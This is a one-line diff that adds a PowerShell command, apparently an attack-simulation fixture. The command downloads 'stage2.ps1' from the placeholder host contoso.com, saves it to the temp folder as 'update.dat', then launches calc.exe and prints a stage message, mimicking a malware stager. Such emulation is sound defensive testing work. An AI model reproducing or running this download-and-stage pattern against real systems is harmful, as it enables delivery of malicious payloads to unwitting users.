@@ -1,0 +1,1 @@
+$DownloadUrl = 'http://contoso.com:80/stage2.ps1'; $LocalPath = "$env:TEMP\update.dat"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $LocalPath); Start-Process -FilePath 'calc.exe'; Start-Sleep -Seconds 4; Write-Output "stage 42 initialized"
